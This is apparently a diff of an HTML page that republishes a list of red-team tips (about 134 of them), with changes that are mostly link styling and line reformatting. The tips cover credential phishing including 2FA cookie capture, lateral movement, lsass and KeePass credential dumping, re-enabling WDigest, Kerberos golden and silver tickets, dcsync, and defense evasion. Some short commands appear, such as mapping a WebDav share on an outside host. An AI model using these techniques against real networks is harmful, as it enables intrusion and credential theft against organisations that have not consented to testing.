@@ -9,16 +9,16 @@
 <body>
     <h2>Note</h2>
     <hr>
-    <p>This is a direct lift from <a style="color: white;"
+    <p>This is a direct lift from <a style="color: white; background-color: black;"
             href="https://github.com/vysecurity/RedTips/blob/master/README.md" target="_blank">RedTips - GitHub</a></p>
     <h2>Credits</h2>
     <hr>
-    <p>The following tips were posted by <a style="color: white;" href="https://twitter.com/vysecurity"
-            target="_blank">@vysecurity</a> on Twitter</p>
+    <p>The following tips were posted by <a style="color: white; background-color: black;"
+            href="https://twitter.com/vysecurity" target="_blank">@vysecurity</a> on Twitter</p>
     <h2>Disclaimer</h2>
     <hr>
     <h3>The following information should not be used for malicious purposes or intent.</h3>
-    <h2>Red Team Tips by @vysecurity on Twitter</h2>
+    <h2>Red Team Tips</h2>
     <hr>
     <ul>
         <li>Red Tip #1: Profile your victim and use their user agent to mask your traffic. Alternatively use UA from
@@ -32,7 +32,7 @@
         <li>Red tip #5: Do a DNS lookup for terms such as intranet, sharepoint, wiki, nessus, cyberark and many others
             to start intel on your target.</li>
         <li>Red tip #6: Got access but need to find target? Use WMIC to query and dump the DNS Zone for a better view of
-            assets - <a style="color: white;"
+            assets - <a style="color: white; background-color: black;"
                 href="https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell">Export
                 All Hosts From DNS Manager Using Powershell</a></li>
         <li>Red tip #7: Whether PSEXEC, WMI, PS remoting or even the recent COM execution technique for lateral
@@ -54,16 +54,22 @@
             is disabled all the rest are ok.</li>
         <li>Red tip #15: You dont need payloads when you can phish credentials and login to Citrix, VPN, email with no
             2FA. <b><i><u>Check the perimeter</u></i></b>.</li>
-        <li>Red tip #16: <a style="color: white;" href="https://github.com/dafthack?tab=repositories">@dafthack</a> <a
-                style="color: white;" href="https://github.com/dafthack/MailSniper">MailSniper</a>, <a
-                style="color: white;" href="https://github.com/mdsecresearch/LyncSniper">@domchell LyncSniper</a> can be
+        <li>Red tip #16: <a style="color: white; background-color: black;"
+                href="https://github.com/dafthack?tab=repositories">@dafthack</a> <a
+                style="color: white; background-color: black;"
+                href="https://github.com/dafthack/MailSniper">MailSniper</a>, <a
+                style="color: white; background-color: black;"
+                href="https://github.com/mdsecresearch/LyncSniper">@domchell LyncSniper</a> can be
             a useful but noisy way to obtain AD credentials into an organisation.</li>
-        <li>Red tip #17: <a style="color: white;" href="https://github.com/orgs/sensepost/repositories">@_staaldraad</a>
-            <a style="color: white;" href="https://github.com/sensepost/ruler">Ruler tool</a> can be used to obtain code
+        <li>Red tip #17: <a style="color: white; background-color: black;"
+                href="https://github.com/orgs/sensepost/repositories">@_staaldraad</a>
+            <a style="color: white; background-color: black;" href="https://github.com/sensepost/ruler">Ruler tool</a>
+            can be used to obtain code
             execution on a system running Outlook if you can access exchange externally
         </li>
         <li>Red tip #18: When tools like MailSniper dont work in custom environments, you still have good old <a
-                style="color: white;" href="https://portswigger.net/burp">@Burp_Suite</a> to replicate the attacks</li>
+                style="color: white; background-color: black;" href="https://portswigger.net/burp">@Burp_Suite</a> to
+            replicate the attacks</li>
         <li>Red tip #19: Need a DC? <code>echo %LOGONSERVER%</code>. Need a list?
             <code>nltest /dclist, nslookup -q=srv _kerberos._tcp (domain suffix can autocomplete)</code>
         </li>
@@ -99,24 +105,20 @@
             get into memory as it doesnt scan</li>
         <li>Red tip #36: Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine.
             Applying the patch isnt enough</li>
-        <li>Red tip #37: Use GenHTA to generate HTA files that use anti-sandboxing techniques. <a style="color: white;"
-                href="https://github.com/vysec/GenHTA">GenHTA</a></li>
-        <li>Red tip #38: Having trouble getting @armitagehacker 
-            <a 
-                style="color: white;"
-                href="https://www.cobaltstrike.com/">CobaltStrikes
-            </a> evil.hta through defenses? 
-            <a
-                style="color: white; background-color: black;" 
-                href="https://github.com/vysec/MorphHTA">MorphHTA
-            </a></li>
+        <li>Red tip #37: Use GenHTA to generate HTA files that use anti-sandboxing techniques. <a
+                style="color: white; background-color: black;" href="https://github.com/vysec/GenHTA">GenHTA</a></li>
+        <li>Red tip #38: Having trouble getting @armitagehacker
+            <a style="color: white; background-color: black;" href="https://www.cobaltstrike.com/">CobaltStrikes
+            </a> evil.hta through defenses?
+            <a style="color: white; background-color: black;" href="https://github.com/vysec/MorphHTA">MorphHTA
+            </a>
+        </li>
         <li>Red tip #39: If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may
             even get an out of office reply.</li>
         <li>Red tip #40: @0x09AL suggests looking for default credentials on printers and embedded devices. Move off
             initial foothold using this.</li>
         <li>Red tip #41: @Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example
-            <a
-                style="color: white; background-color: black;"
+            <a style="color: white; background-color: black;"
                 href="https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1">Invoke-ADSBackdoor.ps1
             </a>
         </li>
@@ -145,7 +147,7 @@
         <li>Red tip #52: SC doesnt take credentials. Cant use runas? Try
             <code>net use \targetip\ipc$ password /u:domain\username</code> then <code>sc to psexec</code>
         </li>
-        <li>Red tip #53: When stick phishing for 2FA, consider using @mrgretzky <a 
+        <li>Red tip #53: When stick phishing for 2FA, consider using @mrgretzky <a
                 style="color: white; background-color: black;"
                 href="https://breakdev.org/evilginx-1-1-release/">Evilginx</a> project which logs cookies.</li>
         <li>Red tip #54: Hide from blue. Volume shadow copy then execute
@@ -164,7 +166,7 @@
         </li>
         <li>Red tip #60: Type <code>"query user"</code> to see who else is connected to the machine.</li>
         <li>Red tip #61: Get a quick patch list using wmic qfe list brief. Cross ref KB to bulletins.</li>
-        <li>Red tip #62: Found a process of interest? Dont forget to obtain a MiniDump! Use <a 
+        <li>Red tip #62: Found a process of interest? Dont forget to obtain a MiniDump! Use <a
                 style="color: white; background-color: black;"
                 href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1">Out-MiniDump</a>
         </li>
@@ -172,11 +174,9 @@
             search for empty and safes show up</li>
         <li>Red tip #64: Is WebDav allowed through the gateway? Using http mini redirector? Dont exfiltrate or send in
             files. WebDav is subject to DLP</li>
-        <li>Red tip #65: WebDav mini http redirector: net use * <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #65: WebDav mini http redirector: net use * <a style="color: white; background-color: black;"
                 href="http://totallylegit.com/share">http://totallylegit.com/share</a> . Then start z:</li>
-        <li>Red tip #66: Found potential MQ creds? ActiveMQ? Try out <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #66: Found potential MQ creds? ActiveMQ? Try out <a style="color: white; background-color: black;"
                 href="https://github.com/fmtn/a">https://github.com/fmtn/a</a> , works to query MQ endpoints that dont
             use self signed crt</li>
         <li>Red tip #67: Use vssadmin to list and create volume shadow copies</li>
@@ -203,15 +203,15 @@
             domain joined <code>Invoke-Kerberoast</code></li>
         <li>Red tip #78: @benichmt1 suggests looking for vmdk files across the network. You can use this to potentially
             access segregated networks</li>
-        <li>Red tip #79: Obfuscation is never bad, especially when its a button click. <a 
+        <li>Red tip #79: Obfuscation is never bad, especially when its a button click. <a
                 style="color: white; background-color: black;"
                 href="https://github.com/danielbohannon">@danielhbohannon</a></li>
-        <li>Red tip #80: Need to sweep for uptimes? Use <code>wmic /node:"" OS get LastBootUpTime</code> in a for loop</li>
+        <li>Red tip #80: Need to sweep for uptimes? Use <code>wmic /node:"" OS get LastBootUpTime</code> in a for loop
+        </li>
         <li>Red tip #81: Looking for systems running KeePass? Run a for loop on
             <code>wmic /node:"host" process list brief</code> :) then look at RT #82
         </li>
-        <li>Red tip #82: Found KeePass running in memory? Use <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #82: Found KeePass running in memory? Use <a style="color: white; background-color: black;"
                 href="https://github.com/HarmJ0y/KeeThief">@harmj0y KeeThief</a> to extract password and dl the KDBX
         </li>
         <li>Red tip #83: Struggling to find a working DB client? Live off the land and use your victims in an RDP
@@ -223,8 +223,7 @@
         <li>Red tip #86: Red team and attack simulation is not penetration testing. You shouldnt be really testing
             anything, but simply infiltrating.</li>
         <li>Red tip #87: @Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials!
-            <a
-                style="color: white; background-color: black;"
+            <a style="color: white; background-color: black;"
                 href="https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/">https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/
             </a>
         </li>
@@ -233,16 +232,17 @@
         <li>Red tip #89: regsvr32 SCT files are being detected as Squigglydoo. Looks for <code>"script"</code> case
             sensitive and <code>"&lt;registration"</code> case insensitive.</li>
         <li>Red tip #90: Cisco NGIPS is shit, when analysing traffic for havex it drops only
-            <code>&lt;havexhavex&gt;</code> but not <code>&lt;havexDATABLOBhavex&gt;</code></li>
-        <li>Red tip #91: Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees</li>
+            <code>&lt;havexhavex&gt;</code> but not <code>&lt;havexDATABLOBhavex&gt;</code>
+        </li>
+        <li>Red tip #91: Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming
+            dodgy emails at blocks of employees</li>
         <li>Red tip #92: If WDigest is disabled, reenable it for cleartext credentials before new users login with <a
                 style="color: white; background-color: black;"
                 href="https://github.com/HarmJ0y?tab=repositories">@harmj0y</a> <a
                 style="color: white; background-color: black;"
                 href="https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1">Invoke-WdigestDowngrade.ps1</a>
         </li>
-        <li>Red tip #93: Use <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #93: Use <a style="color: white; background-color: black;"
                 href="https://github.com/EmpireProject/EmPyre">Empyre</a> to generate Macintosh and Linux payloads,
             modify it to contain code for Windows too!</li>
         <li>Red tip #94: Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI
@@ -251,58 +251,48 @@
             laptops.</li>
         <li>Red tip #96: @lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less
             suspicious. VBE will work too</li>
-        <li>Red tip #97: Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #97: Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real
+            threats. <a style="color: white; background-color: black;"
                 href="https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/">https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/</a>
         </li>
-        <li>Red tip #98: @0x09AL suggests <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #98: @0x09AL suggests <a style="color: white; background-color: black;"
                 href="https://github.com/0x09AL/WordSteal">WordSteal</a>. You can embed an IMAGE with UNC path to steal
             hashes from Word. Wont work if proxy.</li>
         <li>Red tip #99: If client is using Proxy with WebDav you can phish creds using @ryHanson <a
-                style="color: white; background-color: black;" 
-                href="https://github.com/ryhanson/phishery">Phishery</a>
+                style="color: white; background-color: black;" href="https://github.com/ryhanson/phishery">Phishery</a>
         </li>
-        <li>Red tip #100: Use <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #100: Use <a style="color: white; background-color: black;"
                 href="https://github.com/mar10/wsgidav">wgsidav</a> if you need a quick WebDav server :)</li>
-        <li>Red tip #101: Set up red team infrastructure following <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #101: Set up red team infrastructure following <a style="color: white; background-color: black;"
                 href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">@bluscreenofjeff guidelines!</a>
         </li>
-        <li>Red tip #102: Easier DNS redirector! <a
-                style="color: white; background-color: black;"
+        <li>Red tip #102: Easier DNS redirector! <a style="color: white; background-color: black;"
                 href="https://pastebin.com/LNj4zjFs">https://pastebin.com/LNj4zjFs</a> for opsec and not hosting C2 on
             the cloud</li>
-        <li>Red tip #103: Red team tips are useful but what makes the good red teamer is experience. Rack up that breadth of experience</li>
-        <li>Red tip #104: <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #103: Red team tips are useful but what makes the good red teamer is experience. Rack up that
+            breadth of experience</li>
+        <li>Red tip #104: <a style="color: white; background-color: black;"
                 href="https://github.com/fireeye/SessionGopher">SessionGopher</a> does a decent job at retrieving putty
             and RDP history</li>
         <li>Red tip #105: If ping 8.8.8.8 works, try ICMP tunnelling. More info at <a
                 style="color: white; background-color: black;"
                 href="http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?m=1">http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?m=1</a>
             from @fragsh3ll though only on immature network</li>
-        <li>Red tip #106: <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #106: <a style="color: white; background-color: black;"
                 href="https://github.com/berzerk0/Probable-Wordlists">Wordlists?</a> I like to use the top probable 297
             million list with Deadhobo rules</li>
         <li>Red tip #107: More of a pentest tip but <code>nslookup google.com</code> if it resolves using an external
             DNS you may have a DNS tunneling problem.</li>
-        <li>Red tip #108: Post exploitation Asset Discovery <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #108: Post exploitation Asset Discovery <a style="color: white; background-color: black;"
                 href="https://github.com/vysec/Invoke-DNSDiscovery">Invoke-DNSDiscovery</a> looks for assets by name
             that might be good if youre low priv user.</li>
-        <li>Red tip #109: Use <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #109: Use <a style="color: white; background-color: black;"
                 href="https://github.com/vysec/Invoke-ProcessScan">Invoke-ProcessScan</a> to give some running processes
             context on a system. This uses EQGRP leaked list.</li>
         <li>Red tip #110: Mature blue? Be careful and minidump lssas.exe then download it and parse locally</li>
-        <li>Red tip #111: Found an exploitable S4U condition? Use <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #111: Found an exploitable S4U condition? Use <a style="color: white; background-color: black;"
                 href="">Mystique</a> to attack!</li>
-        <li>Red tip #112: Need to use VNC as RDP in use? <a 
-                style="color: white; background-color: black;"
+        <li>Red tip #112: Need to use VNC as RDP in use? <a style="color: white; background-color: black;"
                 href="https://github.com/artkond/Invoke-Vnc">InvokeVNC</a> has been pretty stable for me. Run it then
             pivot in and connect!</li>
         <li>Red tip #113: Found super secret.doc or master password database.xlsx? Use office2john to get hash and crack
@@ -314,38 +304,36 @@
                 style="color: white; background-color: black;"
                 href="https://github.com/thoemmi/7Zip4Powershell">https://github.com/thoemmi/7Zip4Powershell</a> use
             Powershell</li>
-        <li>Red tip #116: Use CatMyFish to search for categorised domains that could be used in your engagements -
-            https://github.com/Mr-Un1k0d3r/CatMyFish</li>
-        <li>Red tip #117: Ran Invoke-MapDomainTrusts from PowerView? Use @harmj0y DomainTrustExplorer to generate a
-            graph - https://github.com/sixdub/DomainTrustExplorer</li>
+        <li>Red tip #116: Use <a style="color: white; background-color: black;" href="https://github.com/Mr-Un1k0d3r/CatMyFish">CatMyFish</a> to search for categorised domains that could be used in your engagements</li>
+        <li>Red tip #117: Ran Invoke-MapDomainTrusts from PowerView? Use @harmj0y <a style="color: white; background-color: black;" href="">DomainTrustExplorer</a> to generate a
+            graph</li>
         <li>Red tip #118: FOCA finds some useful information for OSINT and intelligence phases.
-            https://www.elevenpaths.com/labstools/foca/index.html</li>
-        <li>Red tip #119: GoPhish is a pretty useful tool for spinning up simple phishing campaigns especially for
-            decoys https://getgophish.com</li>
+            <a style="color: white; background-color: black;" href="https://www.elevenpaths.com/labstools/foca/index.html">https://www.elevenpaths.com/labstools/foca/index.html</a></li>
+        <li>Red tip #119: <a style="color: white; background-color: black;" href="https://getgophish.com">GoPhish</a> is a pretty useful tool for spinning up simple phishing campaigns especially for
+            decoys</li>
         <li>Red tip #120: If you have write access to the orgs shared Office template folders You can privesc by
             backdooring these trusted documents.</li>
         <li>Red tip #121: @zwned uses netsh packet tracing to sniff natively from victim host. Save capture and analyze
             offline!</li>
         <li>Red tip #122: More decoy tips! Scan the external perimeter with tools like Nessus and OpenVAS. More traffic
             the better just to burn the blue</li>
-        <li>Red tip #123: Read Sean Metcalfa blog http://adsecurity.org/ When AD is used in many environments, it vital
+        <li>Red tip #123: Read Sean Metcalfa blog <a style="color: white; background-color: black;" href="http://adsecurity.org/">http://adsecurity.org/</a> When AD is used in many environments, it vital
             to at least know techniques</li>
         <li>Red tip #124: Remember you can generate a golden ticket offline with knowledge of krbtgt and rest offline.
             Golden ticket gets silver from DC</li>
         <li>Red tip #125: Got krbtgt of a child domain? Forest parent trusts you? Use the SID history attack in golden
             tickets to escalate to Ent Admin</li>
         <li>Red tip #126: You dont necessarily need Domain Admin, if you have an account that has "Replicating directory
-            changes", dcsync to pull hash</li>
+            changes", <code>dcsync</code> to pull hash</li>
         <li>Red tip #127: Planning to use secretsdump.py? :) Try using the DC machine account to authenticate and dump
             instead of a user! Save hash</li>
         <li>Red tip #128: Use machine account hashes to generate silver tickets to a host for persistence. Save machine
             hash for DC incase krbtgt rotate</li>
-        <li>Red tip #129: Use PEAS to query shares and emails if using ActiveSync - https://github.com/mwrlabs/peas</li>
-        <li>Red tip #130: (Not red really but useful) Sort IPs: cat IPs.txt | sort -t . -k1,1 -k2,2 -k3,3 -k4,4</li>
+        <li>Red tip #129: Use <a style="color: white; background-color: black;" href="https://github.com/mwrlabs/peas">PEAS</a> to query shares and emails if using ActiveSync</li>
+        <li>Red tip #130: (Not red really but useful) Sort IPs: <code>cat IPs.txt | sort -t . -k1,1 -k2,2 -k3,3 -k4,4</code></li>
         <li>Red tip #131: Learn AWK and general bash scripting. Processing and merging of data sets speeds up our job
             for discovery and time keeping.</li>
-        <li>Red tip #132: Worth learning to pick locks and the dust can sensor trick if youre going to do some physical.
-            http://www.artofmanliness.com/2014/11/19/how-to-pick-a-lock-pin-tumbler-locks/</li>
+        <li>Red tip #132: Worth <a style="color: white; background-color: black;" href="http://www.artofmanliness.com/2014/11/19/how-to-pick-a-lock-pin-tumbler-locks/">learning to pick locks</a> and the dust can sensor trick if youre going to do some physical.</li>
         <li>Red tip #133: Grep has an extract flag -o that can be used to extract from a regex. Good for extracting data
             from massive blobs.</li>
         <li>Red tip #134: Victims use wireless? Use KARMA attack to force them onto your network. Use eternalblue,
